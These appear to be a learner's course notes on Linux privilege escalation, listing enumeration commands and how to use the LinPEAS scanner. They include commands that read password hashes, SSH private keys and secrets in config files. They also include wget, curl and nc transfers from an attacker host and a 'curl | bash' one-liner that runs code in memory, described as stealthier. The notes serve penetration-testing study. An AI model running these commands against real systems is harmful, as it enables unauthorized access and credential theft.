# Module 18 Linux Privilege Escalation


---


## 18.1.2 Manual Enumeration:

**Linux Post-Exploitation Enumeration — Quick Reference**

**Identity and privileges:**
```bash
id                          # current user, groups
sudo -l                     # what can you run as root
cat /etc/passwd | grep -v nologin  # users with login shells
cat /etc/shadow             # password hashes (needs root)
cat /etc/sudoers            # sudo configuration (needs root)
```

**System info:**
```bash
uname -a                    # kernel version
cat /etc/os-release         # OS details
hostname                    # machine name
```

**Network:**
```bash
ip a                        # network interfaces
ss -tulnp                   # listening ports (internal services)
netstat -tulnp              # same thing (older systems)
cat /etc/hosts              # internal hostnames
```

**Interesting files:**
```bash
cat /home/<user>/.bash_history    # command history
cat /home/<user>/.ssh/id_rsa     # SSH private keys
ls -la /var/www/html/             # web app config files
cat /var/www/html/config.php      # database credentials
cat /var/www/html/.env            # environment secrets
```

**SUID binaries:**
```bash
find / -perm -u=s -type f 2>/dev/null
```
> use strings to read /bin/ files

Check results against GTFOBins.

**Cron jobs:**
```bash
cat /etc/crontab
ls /etc/cron.d/
cat /var/spool/cron/crontabs/*
```

**Writable directories:**
```bash
/tmp/
/var/tmp/
/dev/shm/
```

**Important groups to check from `id` output:**
- `sudo` → check sudo -l
- `docker` → instant privesc via GTFOBins
- `lxd` → same as docker
- `adm` → can read logs
- `shadow` → can read password hashes
- `disk` → raw disk access

**Automated enumeration:**
```bash
# Transfer and run LinPEAS
wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

**Priority order:**
1. `id` → check groups
2. `sudo -l` → check sudo permissions
3. Run LinPEAS → broad scan
4. SUID binaries → check GTFOBins
5. Cron jobs → look for writable scripts running as root
6. Internal services → hidden attack surfaces


---


## linPEAS my goat, my beloved, my everything 


**Transfer to target:**

Option 1 — Python HTTP server:
```bash
# On Kali
python3 -m http.server 80

# On target -- CAPITAL O !!!
wget http://YOUR_KALI_IP/linpeas.sh -O /tmp/linpeas.sh
# or
curl http://YOUR_KALI_IP/linpeas.sh -o /tmp/linpeas.sh
```

Option 2 — If no wget/curl on target:
```bash
# On Kali
nc -lnvp 9999 < linpeas.sh

# On target
nc YOUR_KALI_IP 9999 > /tmp/linpeas.sh
```

**Run it:**
```bash
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

**Save output for review:**
```bash
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

**Reading the output — color coding:**
- **RED/YELLOW** — almost certain privesc vector, investigate immediately
- **Red** — highly suspicious, likely exploitable
- **Cyan** — interesting but needs manual verification
- **Green** — useful information
- **Blue** — general system info

**What to look for first in output:**
1. Any RED/YELLOW highlights
2. SUID binaries section
3. Writable files and directories
4. Cron jobs
5. Sudo permissions
6. Internal ports listening
7. Credentials in config files

**One liner — download and run without saving to disk:**
```bash
curl http://YOUR_KALI_IP/linpeas.sh | bash
```
This runs LinPEAS directly in memory without touching the filesystem — stealthier but no re-reading the output later.


Focus on the colors first — scan for RED/YELLOW highlights before reading anything else.

**Practical reading order:**

**1. Scroll to "Interesting Files" section**
Look for credentials, SSH keys, config files with passwords

**2. Check "SUID" section**
Cross-reference anything unusual with GTFOBins

**3. Check "Sudo" section**
Same as running `sudo -l` but formatted nicely

**4. Check "Cron Jobs" section**
Look for scripts running as root that you can modify

**5. Check "Internal Ports" section**
Services listening on localhost that weren't visible from outside

**6. Check "Users" section**
Groups, home directories, bash history files


**The habit:**
Run LinPEAS, save output with `tee`, then `grep` for specific things:
```bash
cat /tmp/linpeas_output.txt | grep -i "password"
cat /tmp/linpeas_output.txt | grep -i "suid"
```

---

## 18.2.2 Inspecting service footprints

```bash
watch -n 1 "ps -aux | grep pass"
```